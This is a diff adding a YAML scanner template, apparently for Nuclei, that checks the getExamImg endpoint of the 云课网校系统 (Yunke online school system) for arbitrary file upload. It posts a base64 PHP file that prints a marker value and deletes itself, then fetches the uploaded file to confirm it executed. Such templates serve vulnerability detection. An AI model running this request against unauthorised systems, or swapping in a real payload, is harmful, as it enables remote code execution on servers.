@@ -1,0 +1,46 @@
+id: yunkewangxiao-getExamImg-File-upload
+
+info:
+  name: 云课网校系统 getExamImg 任意文件上传漏洞
+  author: xxx
+  severity: high
+  tags: File upload
+
+http:
+  - raw:
+      - |
+        POST /index/Exam/getExamImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+        Content-Type: application/x-www-form-urlencoded
+
+        src_data=data:image/php;base64,PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
+    extractors:
+       - type: regex 
+         part: body
+         name: time
+         group: 1
+         regex:
+           - '(\b\d{8}\b)'
+         internal: true
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '(\/[a-zA-Z0-9-]+\.php)'
+         internal: true
+  - raw:
+      - |
+        GET /upload/examanswer/{{time}}{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
